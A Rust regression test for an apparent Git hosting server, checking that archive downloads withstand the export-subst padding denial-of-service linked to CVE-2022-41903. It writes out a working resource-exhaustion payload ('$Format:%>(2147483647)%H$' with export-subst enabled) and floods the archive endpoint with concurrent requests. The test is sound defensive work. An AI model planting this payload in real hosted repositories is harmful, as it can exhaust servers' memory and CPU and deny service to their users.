/// `export-subst` padding blew up `git archive` memory and CPU: Git
/// CVE-2022-41903 (integer overflow in `--format` padding) and the Gitea
/// and GitLab archive DoS reports.
#[test]
fn conf_sec_01_archive_export_subst_bounded() {
    let s = TestServer::start_full(
        &[DEMO],
        "[limits]\narchive_timeout = \"30s\"\narchive_max_concurrent = 2\n",
    );
    let git = GitClient::new();
    let d = tempfile::tempdir().unwrap();
    let w = d.path().join("w");
    std::fs::create_dir_all(&w).unwrap();
    git.ok(&w, &["init", "-q", "-b", "main"]);
    std::fs::write(w.join(".gitattributes"), "* export-subst\n").unwrap();
    let line = "$Format:%>(2147483647)%H$\n";
    for i in 0..20 {
        std::fs::write(w.join(format!("f{i}.txt")), line.repeat(50)).unwrap();
    }
    git.ok(&w, &["add", "-A"]);
    git.ok(&w, &["commit", "-q", "-m", "subst"]);
    git.ok(&w, &["push", "-q", &s.url(&DEMO), "main"]);
    s.db.execute("UPDATE repositories SET visibility = 'public'");

    let start = Instant::now();
    let r = s.client().get("/alice/demo/archive/main.tar.gz");
    assert!(
        start.elapsed() < Duration::from_secs(60),
        "archive took {:?}",
        start.elapsed()
    );
    assert!(r.status < 500 || r.status == 503, "{}", r.status);
    assert!(r.bytes.len() < 64 * 1024 * 1024, "{} bytes", r.bytes.len());

    // Concurrent requests are limited, not queued without bound.
    let base = s.base();
    let handles: Vec<_> = (0..20)
        .map(|_| {
            let base = base.clone();
            std::thread::spawn(move || {
                let t = Instant::now();
                let r = slath_tests::http::Client::new(&base).get("/alice/demo/archive/main.zip");
                (r.status, t.elapsed())
            })
        })
        .collect();
    for h in handles {
        let (status, took) = h.join().unwrap();
        assert!(matches!(status, 200 | 429 | 503), "{status}");
        assert!(took < Duration::from_secs(90), "{took:?}");
    }
    assert!(!s.log().contains("panicked"));
}
